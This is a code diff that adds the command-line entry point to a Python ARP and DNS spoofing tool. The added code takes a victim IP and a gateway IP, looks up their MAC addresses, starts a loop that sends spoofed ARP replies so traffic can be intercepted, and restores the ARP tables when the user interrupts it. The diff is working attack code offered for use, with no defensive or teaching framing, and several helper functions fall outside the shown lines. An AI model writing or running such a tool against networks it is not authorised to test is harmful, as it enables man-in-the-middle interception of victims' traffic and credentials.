@@ -48,5 +48,26 @@ def start_arp_spoof(victim_ip, gateway_ip, victim_mac, gateway_mac):
         spoof(gateway_ip, victim_ip, gateway_mac)
         time.sleep(2)
 
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="ARP and DNS Spoofing Tool. Victim and Gateway IPs required.")
+    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
+    parser.add_argument("--gateway", required=True, help="IP address of the gateway")
+    args = parser.parse_args()
 
+    try: 
+        victim_mac = get_mac(args.victim)
+        gateway_mac = get_mac(args.gateway)
 
+                
+        if not victim_mac or not gateway_mac:
+            print("[-] Could not find MAC addresses. Exiting.")
+            sys.exit(1)
+
+        print(f"[+] Victim: {args.victim} ({victim_mac})")
+        print(f"[+] Gateway: {args.gateway} ({gateway_mac})")
+        print("[+] Starting ARP Spoofing... Press CTRL+C to stop")
+
+        start_arp_spoof(args.victim, args.gateway, victim_mac, gateway_mac)
+    except KeyboardInterrupt:
+        print("\n[+] Stopping ARP Spoofing. Restoring network...")
+        restore(args.victim, victim_mac, args.gateway, gateway_mac)
